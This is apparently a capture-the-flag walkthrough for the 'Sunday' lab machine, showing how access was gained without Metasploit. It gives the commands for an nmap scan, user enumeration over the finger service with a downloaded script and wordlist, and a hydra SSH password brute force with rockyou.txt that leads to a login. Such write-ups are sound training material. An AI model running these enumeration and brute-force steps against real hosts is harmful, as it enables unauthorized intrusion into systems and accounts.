Sunday without metasploit

![Sunday](https://user-images.githubusercontent.com/55708909/91526264-db8e9000-e920-11ea-8de4-c2507f4099ee.png)


Starting with nmap scan:

Nmap -sC -sV -T4 -A -O -oA Sunday -p- 10.10.10.76


I saw finger service ruuning and i know this service give info about logged in user.

![Sunday_finger](https://user-images.githubusercontent.com/55708909/91526816-1b09ac00-e922-11ea-8178-b6a72a650e6a.png)

Pentest monkey has an awesome script for finger service , here is the  link

wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl

Run it in order to know who logged into p.c. 

You need a good list for users and here is one from seclist github

wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt

run these command and you will find appropriate users

![Sunday_finger_user](https://user-images.githubusercontent.com/55708909/91527570-a2a3ea80-e923-11ea-8177-96638e20536d.png)

i brute force  sssh and found password sunday

hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022

logged into system.
